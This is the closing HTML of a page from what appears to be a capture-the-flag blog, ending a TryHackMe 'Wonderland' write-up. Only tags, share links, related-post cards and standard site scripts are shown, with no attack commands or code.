</span></pre></table></code></div></div><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/mandatory/pwned.png" alt="" /></p><blockquote><p><a href="https://tryhackme.com/room/wonderland">Wonderland - Tryhackme</a></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='//categories/tryhackme/'>Tryhackme</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="//tags/fuzzing/" class="post-tag no-text-decoration" >Fuzzing</a> <a href="//tags/ssh/" class="post-tag no-text-decoration" >SSH</a> <a href="//tags/date/" class="post-tag no-text-decoration" >Date</a> <a href="//tags/setuid/" class="post-tag no-text-decoration" >SETUID</a> <a href="//tags/gtfobins/" class="post-tag no-text-decoration" >GTFOBINS</a> <a href="//tags/perl/" class="post-tag no-text-decoration" >Perl</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="/knowledge-should-be-free">do wtf you want with it.</a></div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Tryhackme - Wonderland - Rhovelionz&url=http://localhost:4000/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Tryhackme - Wonderland - Rhovelionz&u=http://localhost:4000/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Tryhackme - Wonderland - Rhovelionz&url=http://localhost:4000/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Relevant/">Tryhackme - Relevant</a></li><li><a href="/posts/Tartarus/">Tryhackme - Tartarus</a></li><li><a href="/posts/Traceback/">Hackthebox - Traceback</a></li><li><a href="/posts/Tabby/">Hackthebox - Tabby</a></li><li><a href="/posts/Sauna/">Hackthebox - Sauna</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>More stuffs below ↓</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Overpass/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 24, 2020 <i class="unloaded">2020-08-24T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Overpass</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Tartarus/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 8, 2020 <i class="unloaded">2020-09-08T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Tartarus</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Relevant/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 25 <i class="unloaded">2022-09-25T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Relevant</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <!--<footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/122977"></script></div>--> <!--</div>div.d-flex</footer>--></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '//assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
